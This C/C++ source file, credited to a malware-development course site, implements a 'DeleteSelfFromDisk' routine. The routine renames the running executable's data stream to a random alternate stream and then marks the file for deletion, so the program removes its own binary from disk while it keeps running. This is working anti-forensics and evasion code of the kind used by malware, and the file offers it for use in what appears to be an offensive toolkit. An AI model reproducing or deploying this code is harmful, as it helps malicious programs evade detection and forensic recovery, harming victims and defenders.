/*
* Strongly based on the implementation available on maldevacademy.com
*/

#include "intelligence.h"

// Custom FILE_RENAME_INFO structure definition
typedef struct _FILE_RENAME_INFO_EX {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
    union {
        BOOLEAN ReplaceIfExists;
        DWORD Flags;
    } DUMMYUNIONNAME;
#else
    BOOLEAN ReplaceIfExists;
#endif
    HANDLE RootDirectory;
    DWORD FileNameLength;
    WCHAR FileName[MAX_PATH];     // Instead of FileName[1]
} FILE_RENAME_INFO_EX, * PFILE_RENAME_INFO_EX;

extern "C"{
    BOOL DeleteSelfFromDisk() {

        CONST WCHAR                 NEW_STREAM[7]               = L":%x%x\x00";
        BOOL                        bSTATE                      = FALSE;
        WCHAR					    szFileName[MAX_PATH * 2]    = { 0x00 };
        FILE_RENAME_INFO_EX         FileRenameInfo_Ex            = { .ReplaceIfExists = FALSE, .RootDirectory = 0x00 , .FileNameLength = sizeof(NEW_STREAM)};
        FILE_DISPOSITION_INFO       FileDisposalInfo            = { .DeleteFile = TRUE };
        HANDLE                      hLocalImgFileHandle         = INVALID_HANDLE_VALUE;

        if (GetModuleFileNameW(NULL, szFileName, (MAX_PATH * 2)) == 0x00) {
            PRINT("[!] GetModuleFileNameW Failed With Error: %ld \n", GetLastError());
            goto _END_OF_FUNC;
        }

        swprintf(FileRenameInfo_Ex.FileName, MAX_PATH, NEW_STREAM, rand(), rand() * rand());

        if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x0, NULL)) == INVALID_HANDLE_VALUE) {
            PRINT("[!] CreateFileW [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if (!SetFileInformationByHandle(hLocalImgFileHandle, FileRenameInfo, &FileRenameInfo_Ex, sizeof(FILE_RENAME_INFO_EX))) {
            PRINT("[!] SetFileInformationByHandle [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        CloseHandle(hLocalImgFileHandle);

        if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x0, NULL)) == INVALID_HANDLE_VALUE) {
            PRINT("[!] CreateFileW [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        if (!SetFileInformationByHandle(hLocalImgFileHandle, FileDispositionInfo, &FileDisposalInfo, sizeof(FileDisposalInfo))) {
            PRINT("[!] SetFileInformationByHandle [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        bSTATE = TRUE;

    _END_OF_FUNC:
        if (hLocalImgFileHandle != INVALID_HANDLE_VALUE)
            CloseHandle(hLocalImgFileHandle);
        return bSTATE;
    }
}